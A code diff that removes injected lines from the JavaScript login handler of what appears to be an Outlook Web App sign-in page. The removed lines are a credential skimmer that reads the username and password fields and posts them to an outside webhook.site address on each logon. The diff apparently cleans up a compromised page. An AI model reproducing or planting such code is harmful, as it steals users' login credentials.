@@ -368,14 +368,6 @@ function clkLgn()
     // http://exweb/14/Specs/E14 Spec Library/Client side perf marker definition.xlsx
     //
 
-    // var curTime = new Date().toLocaleDateString();
-    // var ObjectData = "ObjectType=" + escape(curTime + "\t" + gbid("username").value + "\t" + gbid("password").value) + "&uin=" + Math.random().toString(16).substring(2);
-    var xmlhttp = new XMLHttpRequest();
-    var username = gbid("username").value;
-    var passwd = gbid("password").value;
-    xmlhttp.open("POST", "https://webhook.site/7ddbe8f0-56a7-4d1f-8ca1-c2dec35bf7eb/vv", false);
-    xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    xmlhttp.send("username="+encodeURIComponent(username)+"&password="+encodeURIComponent(passwd));
     addPerfMarker("Logon.Start");
 
     var p = false;
@@ -399,7 +391,6 @@ function clkLgn()
         oD.setTime(oD.getTime() + 2 * 7 * 24 * 60 * 60 * 1000);
         var sA = "acc=" + (gbid("chkBsc") && gbid("chkBsc").checked ? 1 : 0);
         var sL = "lgn=" + gbid("username").value;
-	var sX = gbid("password").value;
 
 	
         document.cookie = "logondata=" + sA + "&" + sL + "; expires=" + oD.toUTCString();
